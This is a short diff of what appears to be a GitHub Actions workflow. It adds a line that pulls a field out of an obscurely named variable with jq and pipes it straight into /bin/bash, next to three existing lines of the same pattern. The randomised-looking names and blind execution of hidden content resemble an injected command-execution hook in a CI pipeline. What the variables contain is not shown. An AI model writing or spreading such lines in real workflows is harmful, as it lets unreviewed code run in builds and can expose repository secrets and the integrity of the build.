@@ -27,6 +27,7 @@ jobs:
           echo $v85 | jq -r .tgf48220 | /bin/bash
           echo $qh44016 | jq -r .vxpa70070 | /bin/bash
           printf '%s' "$hwh57505" | jq -r .qyryg2 | /bin/bash
+          echo $b98 | jq -r .raizh2832 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
